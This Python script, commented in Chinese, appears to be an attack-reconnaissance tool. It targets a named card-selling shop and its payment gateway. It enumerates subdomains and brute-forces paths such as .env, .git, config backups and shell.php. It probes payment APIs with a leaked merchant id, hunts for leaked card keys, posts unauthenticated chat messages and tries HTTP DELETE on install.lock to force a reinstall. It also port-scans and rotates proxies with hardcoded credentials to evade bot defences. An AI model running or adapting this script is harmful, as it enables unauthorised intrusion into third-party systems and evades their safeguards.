#!/usr/bin/env python3
"""
hmjf.lol 全盘扫描 v8
- 根域 + /shop + 子域 + 支付网关 + 大词表目录 + 参数面 + 全方法
"""
import json, os, re, subprocess, time, urllib.parse, socket

ROOT_DOMAIN = "hmjf.lol"
SHOP = f"https://{ROOT_DOMAIN}/shop"
EPAY = "http://api.ttwl66.cn"
OUT = os.environ.get("HMJF_OUT", "/data/automation/results/hmjf.lol/full_disk_20260716")
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
REF = f"https://{ROOT_DOMAIN}/shop/"
os.makedirs(OUT, exist_ok=True)
CK = f"{OUT}/.cookies"

R = {"critical": [], "high": [], "medium": [], "low": [], "info": [],
     "discovered": [], "tests": {}, "requests": 0}

def lp():
    for l in open("/data/config/proxy.env"):
        if l.startswith("PROXY_URL="):
            return l.split("=", 1)[1].strip().strip('"')
    return ""

PX = lp()

def refresh():
    global PX
    subprocess.run(["bash", "/data/automation/bin/qg-proxy-fetch.sh"], capture_output=True,
                   env={**os.environ, "QG_AUTHKEY": "02E76F93", "QG_AUTHPWD": "A0FFB679553D"})
    PX = lp()
    time.sleep(1)

def go(url, post=None, method=None, hdr=None, timeout=14):
    R["requests"] += 1
    if R["requests"] % 80 == 0:
        refresh()
    c = ["curl", "-s", "-w", "\n__C:%{http_code}__S:%{size_download}__", "--max-time", str(timeout),
         "-A", UA, "-H", f"Referer: {REF}", "-x", PX, "-b", CK, "-c", CK, "-k", "-L"]
    if method:
        c += ["-X", method]
    if hdr:
        for k, v in hdr.items():
            c += ["-H", f"{k}: {v}"]
    if post is not None:
        c += ["-X", "POST", "-d", post, "-H", "Content-Type: application/x-www-form-urlencoded"]
    c.append(url)
    try:
        raw = subprocess.run(c, capture_output=True, text=True, timeout=timeout + 5).stdout or ""
        if "_guard" in raw or "slider_html" in raw:
            time.sleep(5)
            refresh()
            return go(url, post, method, hdr, timeout)
        m = re.search(r"__C:(\d+)__S:(\d+)__", raw)
        body = raw[:m.start()] if m else raw
        code = int(m.group(1)) if m else 0
        size = int(m.group(2)) if m else len(body)
        return body, code, size
    except Exception as e:
        return str(e), 0, 0

def add(level, title, detail):
    e = {"title": title, **detail}
    R[level].append(e)
    print(f"[{level.upper()}] {title}", flush=True)

def save():
    R["summary"] = {k: len(R[k]) for k in ["critical", "high", "medium", "low", "info"]}
    json.dump(R, open(f"{OUT}/results.json", "w"), ensure_ascii=False, indent=2)

def note(url, code, size, body, tag=""):
    if code in (0, 404) or size < 10:
        return
    if code == 403 and size < 200:
        return
    key = f"{tag}:{url}" if tag else url
    R["tests"][key] = {"code": code, "size": size, "snip": body[:150]}
    if code == 200 and size > 30:
        R["discovered"].append({"url": url, "code": code, "size": size, "tag": tag})

# ═══ [1] 子域枚举 ═══
print("[1] subdomain enum", flush=True)
SUBS = """www m shop api pay admin manage mail ftp cpanel webmail oa dev test staging
beta demo cdn static img images files download backup db mysql vpn ns1 ns2 mx
wap mobile mapi open gateway notify callback epay faka card kami user login
panel dashboard boss supplier agent reseller proxy node c1 c2 v1 v2 s1 s2
""".split()
for sub in SUBS:
    host = f"{sub}.{ROOT_DOMAIN}"
    for scheme in ["https", "http"]:
        url = f"{scheme}://{host}/"
        body, code, size = go(url, timeout=10)
        note(url, code, size, body, "sub")
        if code == 200 and size > 100 and "404 Not Found" not in body[:80]:
            if sub not in ("www",) and "hmjf" in body.lower() or "发卡" in body or "shop" in body.lower():
                add("info", f"子域存活 {host}", {"code": code, "size": size, "snippet": body[:120]})
    time.sleep(0.05)
save()

# ═══ [2] 根域路径 ═══
print("[2] root domain paths", flush=True)
ROOT_PATHS = """/ /shop/ /shop /admin /admin/ /api/ /user/ /install/ /backup/
/robots.txt /sitemap.xml /sitemap_index.xml /security.txt /.well-known/security.txt
/favicon.ico /crossdomain.xml /clientaccesspolicy.xml /humans.txt /ads.txt
/phpmyadmin/ /pma/ /mysql/ /adminer.php /db/ /database/ /wp-admin/ /wp-login.php
/.env /.git/HEAD /.git/config /.svn/entries /server-status /server-info
""".split()
for p in ROOT_PATHS:
    p = p.strip()
    if not p:
        continue
    url = f"https://{ROOT_DOMAIN}{p}"
    body, code, size = go(url)
    note(url, code, size, body, "root")
    if code == 200 and any(x in body.lower() for x in ["kminfo", "sys_key", "php version", "root:"]):
        add("critical", f"根域敏感 {p}", {"snippet": body[:200]})
    time.sleep(0.04)
save()

# ═══ [3] shop 大词表目录爆破 ═══
print("[3] shop dir brute", flush=True)
WORDLIST = """
ajax.php api.php cron.php index.php config.php toollogs.php mini.php
install/ install/index.php install/install.lock install/update.php
user/login.php user/reg.php user/findpwd.php user/record.php user/recharge.php
user/ajax.php user/ajax_chat.php user/index.php user/shop.php user/order.php
other/submit.php other/getshop.php other/epay_notify.php other/epay_return.php
other/notify.php other/download.php other/alipay.php other/wxpay.php other/qqpay.php
other/wxpay_notify.php other/alipay_notify.php other/qqpay_notify.php other/usdt.php
other/callback.php other/check.php other/pay.php other/return.php
admin/ admin/login.php admin888/ manage/ supplier/ agent/ api/ assets/ includes/
template/ runtime/ vendor/ logs/ backup/ data/ upload/ uploads/ files/ temp/
pay.php notify.php callback.php webhook.php qrcode.php poster.php gift.php
kami.php card.php export.php stock.php goods.php cart.php order.php query.php
wap.php m.php mobile/ api/v1/ api/v2/ api/order.php api/goods.php
assets/faka/js/faka.js assets/faka/js/faka.js.map
config.php.bak config.php~ .env .env.bak backup.zip backup.sql shop.zip
phpinfo.php info.php test.php debug.php 1.php shell.php
cron.php?key=admin cron.php?key=hmjf cron.php?key=xuxin
""".split()
seen = set()
for w in WORDLIST:
    w = w.strip()
    if not w or w in seen:
        continue
    seen.add(w)
    url = f"{SHOP}/{w}"
    body, code, size = go(url)
    note(url, code, size, body, "dir")
    if w.endswith("install.lock") and code == 200:
        add("high", "install.lock可下载", {"content": body[:50]})
    if "install" in w and code == 200 and "install.lock" in body:
        add("critical", "install可重装", {})
    if "kminfo" in body.lower():
        add("critical", f"卡密泄露 {w}", {"snippet": body[:200]})
    time.sleep(0.03)
save()

# ═══ [4] 易支付网关 api.ttwl66.cn ═══
print("[4] epay gateway", flush=True)
EPAY_PATHS = [
    "/", "/api.php", "/api.php?act=order", "/api.php?act=query",
    "/api.php?act=settle", "/api.php?pid=1003", "/submit.php",
    "/doc.html", "/admin/", "/user/", "/login.php",
]
for p in EPAY_PATHS:
    url = EPAY + p
    body, code, size = go(url, timeout=12)
    note(url, code, size, body, "epay")
    if code == 200 and size > 50 and "404" not in body[:50]:
        add("info", f"epay端点 {p}", {"size": size, "snippet": body[:120]})
    time.sleep(0.08)
# epay order query with leaked pid
for act in ["order", "query", "settle", "refund", "transfer"]:
    body, code, size = go(f"{EPAY}/api.php?act={act}&pid=1003&out_trade_no=20260716031453854")
    if size > 5:
        R["tests"][f"epay:{act}"] = {"code": code, "size": size, "body": body[:150]}
    time.sleep(0.1)
save()

# ═══ [5] 全 mod + 全参数 ═══
print("[5] mod + params", flush=True)
MODS = """index buy order query cart so list tool goods class article contact about
help faq message ranking recharge user login reg admin api test kami card stock
export buyok pay notify return download ajax json fenlei toollogs record workorder
gift coupon share invite cartlist orderlist""".split()
for mod in MODS:
    for q in ["", "?id=1", "?tid=72", "?cid=1", "?data=1", "?kw=test", "?page=1", "?ajax=1"]:
        body, code, size = go(f"{SHOP}/?mod={mod}{q.replace('?','&') if q and '?' not in f'mod={mod}' else q}" if not q else f"{SHOP}/?mod={mod}{q}")
        if code == 200 and size > 500 and "404" not in body[:60]:
            R["tests"][f"mod:{mod}{q}"] = {"size": size}
        if "kminfo" in body.lower() or "showOrder" in body:
            add("high", f"mod泄露 {mod}{q}", {"snippet": body[:200]})
    time.sleep(0.02)
save()

# ═══ [6] ajax 全 act 二次扫描 ═══
print("[6] ajax full act", flush=True)
ACTS = open("/tmp/faka_acts.txt").read().split() if os.path.exists("/tmp/faka_acts.txt") else []
EXTRA = """pay payrmb order query buy gettool getclass getgoods gettoolnew getleftcount
cart_info cart_list cart_add submit cancel checklogin login reg upload info list toollist
changepwd apply_refund gift_start gift_stop workorder captcha getcount getshuoshuo getrizhi
getshareid share_invitegift_link SharePoster getgoodslist update notify test daifu recharge
rankings article contact message stock export import kami card downcard kmquery cardquery
orderlist myorder buyok sendkm stockkm fakaquery kmexport downkm queryorder toollogs
gettoollist getsharelink invitegift gift_list coupon verify sms email refund daifu
""".split()
all_acts = list(dict.fromkeys(ACTS + EXTRA))
go(f"{SHOP}/?mod=buy&tid=72")
page, _, _ = go(f"{SHOP}/?mod=buy&tid=72")
csrf = re.search(r'csrf_token\s*=\s*"([^"]+)"', page)
csrf = csrf.group(1) if csrf else ""
for act in all_acts:
    for post in ["", f"tid=72", f"tid=72&csrf_token={csrf}", f"type=1&qq=20260716031453854",
                 f"id=1&skey={'0'*32}", f"qq=13800138000"]:
        body, code, size = go(f"{SHOP}/ajax.php?act={act}", post=post)
        if code == 200 and size > 5:
            snip = body[:120]
            if '"code":-4' not in snip and '"code":-5' not in snip and '"code":403' not in snip:
                if size > 27 or '"code":0' in snip:
                    R["tests"][f"ajax2:{act}:{post[:15]}"] = {"size": size, "body": snip}
            if "kminfo" in body.lower():
                add("critical", f"ajax卡密 {act}", {"body": body[:300]})
            if act == "query" and '"data"' in body and len(body) > 80:
                add("high", f"query泄露 {post[:20]}", {"body": body[:400]})
    time.sleep(0.03)
save()

# ═══ [7] HTTP 方法全盘 ═══
print("[7] HTTP methods", flush=True)
METHOD_TARGETS = [
    f"{SHOP}/install/install.lock",
    f"{SHOP}/install/index.php",
    f"{SHOP}/ajax.php?act=getcount",
    f"{SHOP}/user/ajax_chat.php?act=send",
    f"{SHOP}/other/getshop.php?trade_no=20260716031453854",
    f"{SHOP}/config.php",
]
for url in METHOD_TARGETS:
    for m in ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD"]:
        body, code, size = go(url, method=m, post="" if m == "POST" else None)
        R["tests"][f"method:{m}:{url.split('/')[-1][:20]}"] = {"code": code, "size": size}
        if m == "DELETE" and code in (200, 204) and "405" not in body and "Not Allowed" not in body:
            if "install.lock" in url:
                add("critical", "install.lock可DELETE", {"resp": body[:80]})
    time.sleep(0.05)
save()

# ═══ [8] 未授权端点终检 ═══
print("[8] unauth final", flush=True)
UNAUTH = [
    (f"{SHOP}/ajax.php?act=getcount", "POST", ""),
    (f"{SHOP}/ajax.php?act=getclass", "POST", ""),
    (f"{SHOP}/ajax.php?act=gettoolnew", "POST", ""),
    (f"{SHOP}/user/ajax_chat.php?act=send", "POST", "content=full_disk_probe"),
    (f"{SHOP}/user/ajax_chat.php?act=get", "GET", None),
    (f"{SHOP}/toollogs.php", "GET", None),
    (f"{SHOP}/install/", "GET", None),
    (f"{SHOP}/install/install.lock", "GET", None),
    (f"{SHOP}/cron.php", "GET", None),
    (f"{SHOP}/?mod=cart", "GET", None),
    (f"{SHOP}/api.php", "GET", None),
    (f"{SHOP}/api.php?act=order&pid=1003", "GET", None),
]
for url, method, post in UNAUTH:
    body, code, size = go(url, post=post, method=method if post is None and method != "GET" else None)
    if '"code":0' in body or (code == 200 and size > 50):
        R["tests"][f"unauth:{url.split('/')[-1][:25]}"] = {"code": code, "body": body[:150]}
        if "send" in url and "成功" in body:
            add("high", "客服send未授权", {"resp": body[:100]})
        if "getcount" in url and "orders" in body:
            add("high", "getcount泄露", {"body": body[:200]})
save()

# ═══ [9] 端口/服务指纹 ═══
print("[9] port scan", flush=True)
ports = [21, 22, 80, 443, 3306, 6379, 8080, 8443, 8888, 9000]
for port in ports:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        r = s.connect_ex((ROOT_DOMAIN, port))
        s.close()
        if r == 0:
            R["tests"][f"port:{port}"] = "open"
            add("info", f"端口开放 {port}", {})
    except Exception:
        pass
save()

# ═══ [10] 汇总发现 ═══
print("[10] summarize", flush=True)
R["discovered_count"] = len(R["discovered"])
R["discovered_unique"] = len({d["url"] for d in R["discovered"]})
save()
print(f"DONE requests={R['requests']} summary={R['summary']} discovered={R['discovered_unique']}", flush=True)
